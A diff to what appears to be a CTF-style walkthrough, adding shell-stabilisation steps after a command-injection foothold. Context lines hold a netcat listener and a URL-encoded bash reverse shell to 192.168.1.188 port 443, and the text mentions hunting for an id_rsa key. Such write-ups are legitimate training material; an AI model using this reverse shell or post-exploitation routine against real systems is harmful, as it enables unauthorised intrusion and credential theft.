@@ -236,7 +236,7 @@ nc -nlvp 443
 ```
 <h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/377d9fb7-f309-4725-a708-bdd6023d63a7"></picture></h3>
 
-### **In our browser we enter the linner command **
+### **In our browser we enter the linner command**
 
 ```bash
 bash -c "bash -i >%26 /dev/tcp/192.168.1.188/443 0>%261"
@@ -245,8 +245,25 @@ bash -c "bash -i >%26 /dev/tcp/192.168.1.188/443 0>%261"
 
 <h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/b1d69e65-8664-405a-b933-0bbcb9300158"></picture><br>We are in</h3>
 
+### **- We apply TTY treatment:**
+```bash
+script /dev/null -c bash
+"CTRL+Z"
+stty raw -echo; fg
+reset xterm
+export TERM=xterm
+export SHELL=bash
+```
 
+### **we apply the correct ratio to the new console:**
+```bash
+stty size
+stty rows 61 columns 184
+```
 
+### **- Investigating inside the breached machine:**
 
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/84f3faef-e3b2-4e60-bdc5-0b54f04e2488"></picture><br>Searching in the system we found a potential access way by using the id_rsa but we do not have access to this information because we do not have the necessary permissions.</h3>
+<br>
 
 
